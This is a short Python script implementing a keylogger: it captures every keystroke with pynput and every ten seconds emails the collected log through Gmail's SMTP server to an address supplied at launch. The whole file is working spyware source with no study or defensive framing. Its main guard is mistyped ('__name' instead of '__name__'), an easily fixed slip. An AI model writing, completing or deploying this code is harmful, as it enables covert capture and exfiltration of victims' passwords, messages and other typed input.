import pynput, threading, smtplib

class Keylogger():
    def __init__(self, email, password):
        self.keylogs = ''
        self.email = email
        self.password = password

    def append_to_keylogs(self, string):
        self.keylogs = self.keylogs + string

    def process_key_listen(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " "+str(key)+" "
        self.append_to_keylogs(current_key)

    def report(self):
        print(self.keylogs)
        self.send_mail(self.email, self.password, self.keylogs)
        self.keylogs = ' '
        timer = threading.Timer(10, self.report)

        timer.start()

    def start(self):
        keyboard_listner = pynput.keyboard.Listener(on_press=self.process_key_listen)
        with keyboard_listner:
            self.report()
            keyboard_listner.join()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()


if __name=='__main__':
    email = input("Enter the email : ")
    password = input("Enter your email password : ")
    mykeylogger = Keylogger(email, password)
    mykeylogger.start()